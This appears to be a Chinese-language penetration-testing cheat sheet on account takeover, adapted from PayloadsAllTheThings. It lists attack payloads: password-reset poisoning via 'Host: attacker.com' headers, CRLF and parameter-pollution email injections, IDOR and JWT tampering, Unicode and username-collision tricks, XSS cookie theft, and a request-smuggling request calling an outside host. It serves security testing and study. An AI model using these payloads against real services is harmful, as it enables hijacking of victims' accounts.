# Account Takeover - 账户接管

[SEARCH_KEYWORDS]
漏洞类型: Account Takeover ATO 账户接管 账户劫持
攻击类型: Unauthorized Access Identity Theft Credential Theft Session Hijacking
关键词: password reset token email account hijack takeover session cookie
技术: Password Reset Poisoning IDOR Unicode Normalization CSRF XSS JWT
CVE: CVE-2020-7245

[CONTENT]

## 账户接管概述

账户接管(ATO)是网络安全领域的重大威胁，涉及通过各种攻击向量未经授权访问用户账户。

## 密码重置功能漏洞

### 通过Referer泄露Token

1. 请求密码重置到你的邮箱
2. 点击密码重置链接
3. 不要修改密码
4. 点击任何第三方网站(如Facebook, Twitter)
5. 在Burp Suite中拦截请求
6. 检查referer头是否泄露密码重置token

### 密码重置投毒

1. 在Burp Suite中拦截密码重置请求
2. 添加或修改头部：`Host: attacker.com`, `X-Forwarded-Host: attacker.com`

```http
POST https://example.com/reset.php HTTP/1.1
Accept: */*
Content-Type: application/json
Host: attacker.com
```

3. 查找基于host header的重置URL：`https://attacker.com/reset-password.php?token=TOKEN`

### 邮箱参数注入

```powershell
# 参数污染
email=victim@mail.com&email=hacker@mail.com

# 邮箱数组
{"email":["victim@mail.com","hacker@mail.com"]}

# 抄送
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# 分隔符
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

### API参数IDOR

1. 登录账户并进入修改密码功能
2. 启动Burp Suite拦截请求
3. 修改参数：User ID/email

```powershell
POST /api/changepass
[...]
("form": {"email":"victim@email.com","password":"securepwd"})
```

### 弱密码重置Token

Token生成算法可能使用以下变量：
- Timestamp
- UserID
- Email
- Firstname/Lastname
- Date of Birth
- 仅数字
- 短token序列(<6字符)
- Token重用
- Token过期时间

### 泄露密码重置Token

1. 触发密码重置请求
2. 检查服务器响应中的`resetToken`
3. 使用token：`https://example.com/v3/user/password/reset?resetToken=[TOKEN]&email=[MAIL]`

### 用户名碰撞

1. 注册与受害者用户名相同的账户，但前后插入空格：`"admin "`
2. 请求密码重置
3. 使用发送到邮箱的token重置密码

CVE-2020-7245 (CTFd)

### Unicode规范化问题

- 受害者账户：`demo@gmail.com`
- 攻击者账户：`demⓞ@gmail.com`

工具：unisub, unicode-pentester-cheatsheet

## 通过Web漏洞接管账户

### XSS接管

1. 找到XSS漏洞(域名范围cookie)
2. 泄露当前会话cookie
3. 使用cookie认证为用户

### HTTP请求走私

```powershell
GET /  HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
Content-Length: 83

0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```

### CSRF接管

1. 创建CSRF payload
2. 发送payload给受害者

### JWT接管

- 修改JWT中的User ID/Email
- 检查弱JWT签名

## 参考文档

原始来源: PayloadsAllTheThings/Account Takeover/README.md